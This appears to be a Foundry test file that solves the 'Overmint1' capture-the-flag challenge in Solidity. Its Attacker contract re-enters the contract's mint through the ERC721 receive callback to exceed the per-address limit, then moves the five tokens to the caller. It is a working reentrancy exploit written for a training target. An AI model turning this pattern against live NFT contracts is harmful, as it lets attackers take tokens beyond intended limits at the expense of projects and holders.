// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint1} from "../../src/ctf/Overmint1.sol";
import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Test is Test {
    Overmint1 overmint;
    Attacker attacker;
    address owner;
    address alice;

    function setUp() public {
        owner = address(this);
        alice = makeAddr("alice");

        overmint = new Overmint1();
        attacker = new Attacker();
    }

    function testAttack() public {
        vm.startPrank(alice);
        attacker.pwn(address(overmint));
        attacker.getTokens(address(overmint));
        assertTrue(overmint.success(alice));
    }
}

contract Attacker {
    function pwn(address overmint) public {
        IOvermint(overmint).mint();
    }

    function getTokens(address overmint) public {
        for (uint256 i = 1; i < 6; i++) {
            IOvermint(overmint).transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (IOvermint(msg.sender).balanceOf(address(this)) < 5) {
            pwn(msg.sender);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

interface IOvermint {
    function mint() external;
    function balanceOf(address owner) external view returns (uint256 balance);
    function transferFrom(address from, address to, uint256 tokenId) external;
}